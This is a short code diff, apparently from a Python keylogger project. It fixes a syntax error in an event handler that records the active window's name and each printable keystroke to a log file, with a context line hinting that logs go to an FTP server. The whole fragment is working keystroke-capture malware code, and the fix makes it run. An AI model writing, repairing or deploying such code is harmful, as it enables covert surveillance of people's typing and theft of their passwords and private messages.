@@ -48,7 +48,7 @@ or an FTP server
 def _event(event):
     global window
     try:
-        if event.WindowName != window]:
+        if event.WindowName != window:
             window = event.WindowName
             logs.write("\n[{}]\n".format(window))
         if event.Ascii > 32 and event.Ascii < 127:
